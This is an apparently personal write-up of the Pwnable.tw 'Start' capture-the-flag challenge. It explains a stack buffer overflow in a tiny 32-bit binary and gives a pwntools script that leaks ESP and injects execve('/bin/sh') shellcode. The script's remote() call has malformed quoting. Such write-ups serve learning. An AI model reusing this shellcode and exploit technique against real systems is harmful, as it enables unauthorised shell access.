# Writeup for the first challenge on Pwnable.tw: Start

## Examine

Let's look at the challenge first.

![The challenge](https://media.discordapp.net/attachments/1001097982957068298/1017971596805283854/unknown.png)

Just that. No hint.

But this's the first one so it should be easy anyway, let's dig deep into.

Connect to the nc server and we have:

![netcat](https://media.discordapp.net/attachments/1001097982957068298/1017973004078166037/unknown.png)

It waits for our input, try to put some text, and the connection just close, nothing happened. The **file** command used on the downloaded binary file gives us some information:

![file](https://media.discordapp.net/attachments/1001097982957068298/1017974220078194708/unknown.png)

Cool. 32-bit so we should use IDA 32 instead of 64.

Open it on IDA and there are only 2 functions: _start and _exit.

The _start function:

![_start](https://media.discordapp.net/attachments/1001097982957068298/1017987415325016164/unknown.png)

Understanding the code in each group in order/ reverse order:
- Push esp, _exit onto the stack, use **XOR** to clean up registers.
- Push the string: `'Let's start the CTF:'` onto the stack. In another word, the $esp register holds the string at this step.
- _0x08048087_ - _0x0804808f_: When you see the `int 0x80`, before it should be a syscall. In this case, al register (8 bits version of eax) is set to 4, so the function wants to call sys_write here. 

`ssize_t write(int fd, const void *buf, size_t count);`

`write() writes up to count bytes from the buffer starting at buf to the file referred to by the file descriptor fd.`

_write(2) — Linux manual page_

The fd, in this case, is set to 1 (mov bl,1), which means it wants the program to print the output to STDOUT instead of file(s).

```assembly
mov bl, 0x14
```
Size of the string it wants to print.

```assembly
mov ecx, esp
```
ECX will hold "Let's start the CTF:" from now on and parse to write() as `const void *buf`

- _0x08048091_ - _0x08048097_: This time, the al is set to 3, which means it wants to call sys_read.

```c
ssize_t read(int fd, void *buf, size_t count);
```

`read() attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.`

_read(2) - Linux manual page_

```assembly
XOR ebx, ebx
```
Clean up the register.

```assembly
mov dl, 0x3C
```
Read 60 bytes from STDINT.

- And the problem happen at _0x08048099_ - _0x0804809c_

```assembly
add esp, 0x14
retn
```

But the `sys_read` allow us to write 60 bytes into the stack, this's where the [Buffer Overflow](https://en.wikipedia.org/wiki/Buffer_overflow) happens.

## Exploit

We have confirmed this binary has [Buffer Overflow](https://en.wikipedia.org/wiki/Buffer_overflow) vulnerability. Our input from buf[20] will overwrite the Instruction Pointer (EIP).

> EIP is a register in x86 architectures (32bit). It holds the "Extended Instruction Pointer" for the stack. In other words, it tells the computer where to go next to execute the next command and controls the flow of a program.

To make sure, we open the binary in pwn-dbg and type 24 characters "A" to the input (the last 4 "A" to overwrite $EIP).

And we get:

![BOF](https://media.discordapp.net/attachments/1001097982957068298/1018049372749037608/unknown.png)

So we successfully overwrite EIP. And if we continue to execute the program, it will jump to _0x41414141_ (ASCII character of "A"), which is an invalid address.

------------------------------------------------------------------------------------------------------------------------------------------------------------------

And now the exploit will be:

- Overwrite the $EIP to _0x08048087_ to call sys_write one more time to write _0x14_ bytes on the stack. And the first 4 bytes will be the address of $ESP. Next, it will execute the sys_read one more time, the same as the previous one, allowing us to input the second payload.
- The second payload will overwrite $EIP's address with the leaked $ESP address + _0x14_ + [shellcode](http://shell-storm.org/shellcode/) to give us a shell.

About learning to write shellcode, visit [here](https://www.vividmachines.com/shellcode/shellcode.html#:~:text=In%20computer%20security%2C%20shellcoding%20in,to%20accomplish%20a%20desired%20task.).

**Exploit.py** (using Pwntools)

```python
from pwn import *
r = remote('nc chall.pwnable.tw, '10000')
r.recvuntil(':')
garbage = b'A'*0x14
payload = garbage + p32(0x8048087)
r.send(payload)
leak_esp = u32(r.recv()[:4])
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload2 = garbage + p32(leak_esp+0x14) + shellcode
r.sendline(payload2)
r.interactive()
```

Run the exploit, and we win.

![getflag](https://media.discordapp.net/attachments/1001097982957068298/1018086283702186074/unknown.png)
